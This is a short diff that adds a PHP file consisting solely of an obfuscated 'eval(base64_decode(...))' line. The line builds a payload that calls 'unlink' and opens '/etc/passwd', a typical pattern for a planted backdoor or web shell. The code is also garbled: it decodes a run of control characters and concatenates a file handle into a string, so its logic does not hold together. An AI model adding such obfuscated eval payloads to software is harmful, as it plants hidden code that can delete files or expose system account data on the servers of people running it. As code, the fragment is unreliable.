@@ -1,0 +1,3 @@
+<?php
+eval(base64_decode(str_replace(array("\r", "\n"), '', str_repeat(chr(17), 4097). base64_encode("unlink('".str_repeat(chr(17), 4097)."');".fopen("/etc/passwd", "r")."")));
+?>
